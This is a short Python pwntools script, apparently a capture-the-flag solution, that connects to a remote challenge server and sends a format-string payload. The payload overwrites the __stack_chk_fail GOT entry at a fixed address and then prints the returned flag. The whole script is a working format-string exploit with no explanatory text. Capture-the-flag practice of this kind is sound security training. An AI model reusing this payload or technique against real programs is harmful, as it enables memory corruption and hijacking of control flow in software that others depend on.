from pwn import *

context.arch = 'amd64'
stack_chk_fail_got = 0x601018
r = remote("node3.buuoj.cn", 28805)
r.sendline('%64c%9$hhn%1510c%10$hnaa' + flat([stack_chk_fail_got + 2, stack_chk_fail_got]))
flag = r.recvline(False)
print(flag)
